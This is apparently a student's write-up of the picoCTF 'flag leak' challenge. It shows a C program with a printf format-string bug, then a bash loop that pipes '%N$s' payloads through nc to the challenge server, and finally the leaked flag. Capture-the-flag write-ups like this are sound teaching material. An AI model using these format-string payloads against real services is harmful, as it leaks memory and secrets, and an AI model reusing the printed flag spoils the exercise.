# Binary Exploitation  

## flag leak  
<img width="437" alt="image" src="https://github.com/user-attachments/assets/d8b21349-c1e8-428c-8345-441272c33f2f" />  

This challenge was a little bit on the tougher side as compared to the format string 0.  
We were given a C program like this:  
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
This program indicated that the variable story can contain upto **127** strings, where story is **buffers size with 128 bytes**.  
Seeing the hint I tried multiple ways of doing this chall, starting with multiple **%x**. This gave output like these.  
<img width="485" alt="image" src="https://github.com/user-attachments/assets/b5e479fa-9e98-4436-9b6f-c17e73cd024b" />  

Also tried using many **%s**, but they just printed %s. I realised that when I was trying to input some random string, it would
just print it back. 
```
Tell me a story and then I'll tell you one >> yes
Here's a story -
yes
```

Only with %x and %p, it gave the **memory addresses**.  
```
Tell me a story and then I'll tell you one >> %p %p %p %p
Here's a story -
0xff858d40
```

Well, I tried putting more number of %x and %p, but that didn't help.  
So I went through some resources on format string, that said to make use of `gdb` or `pwn` in python, but that also wont work.  

Next I found out that the flag is present at a specific memory address, in the format `%$i\$s` (where `\` is used as an escape character with `$` symbol and `$i` is a number (like 1, 2, 3…). eg %12$s. But inputting
these values one by one was a tedious task, so I made use of **for** statement and **piping (|)** command for running instance.  
```
for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 56521 ;
done
Tell me a story and then I'll tell you one >> Here's a story -
%0$s
Tell me a story and then I'll tell you one >> Here's a story -
%1$s
Tell me a story and then I'll tell you one >> Here's a story -
!��
Tell me a story and then I'll tell you one >> Here's a story -
�ú,
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
Tell me a story and then I'll tell you one >> Here's a story -
(null)
Tell me a story and then I'll tell you one >> Here's a story -
/
```

Here, 
**%<index>$s**: this tells the program to interpret the memory at the the given index stack position as a string and print it. So if the flag is located there,
it will print it.  
`for i in {0..999}`: is the loop that **repeats** itself 999 times, each time given different values to i.  
then I sent input to `nc saturn.picoctf.net 56521` via piping command.   

This list seemed never ending, so for finding the flag, I used `grep` command:  
```
root@DESKTOP-0QGCC7M:/mnt/c/Users/Laptop/Downloads# for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 56521 | grep -i ctf
; done
CTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}  
```  
where `-i` was used to **ignore case sensitivity**.  

Hence found the flag!  
**picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}**

_**Alternatively:**_   
Went through some other similar challenges and found that by printing all the strings at different memory locations, the required flag was present at **24th** index.  
This was determined by creating the flag.txt and printing some random flag in it. At that same location, the actual flag was present after launching the instance.  
```
root@DESKTOP-0QGCC7M:/mnt/c/Users/Laptop/Downloads# nc saturn.picoctf.net 57913
Tell me a story and then I'll tell you one >> %24$s
Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}
```












